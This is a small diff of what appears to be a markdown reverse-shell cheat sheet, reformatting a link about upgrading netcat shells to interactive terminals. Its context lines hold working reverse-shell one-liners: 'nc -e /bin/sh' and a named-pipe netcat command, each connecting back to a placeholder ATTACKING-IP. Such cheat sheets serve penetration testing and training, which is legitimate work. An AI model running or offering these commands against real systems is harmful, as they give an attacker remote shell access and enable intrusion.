@@ -127,10 +127,9 @@ nc -e /bin/sh ATTACKING-IP 80
 
 ```
 rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
-
 ```
 
-Upgrade Netcat shell to an interactive: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
+Upgrade Netcat shell to an interactive: [https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
 
 ### Ncat
 
